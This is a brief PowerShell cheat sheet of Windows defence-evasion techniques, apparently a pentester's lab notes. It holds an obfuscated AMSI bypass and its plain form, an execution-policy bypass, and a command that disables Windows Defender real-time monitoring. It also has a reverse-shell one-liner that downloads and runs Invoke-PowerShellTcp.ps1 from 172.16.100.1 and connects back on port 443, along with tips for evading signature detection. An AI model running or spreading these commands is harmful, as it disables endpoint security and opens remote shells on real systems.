# Bypass Technique
> test

## ASMI
```powershell
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )


[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## Execution Policy
bypass execution retriction
```powershell
powershell -ep bypass
```
## Window Defender
```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
```

revshell
```powershell
powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.1/Invoke-PowerShellTcp.ps1'''); Power -Reverse -IPAddress 172.16.100.1 -Port 443
```

## Applocker
see app locker policy
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Constraint Language Mode
It cannot run with dot in the front, you could modified it by appendindg the function you want to call on the end of the ps file.

## Signature base
Changing the name of the ps file and/or functions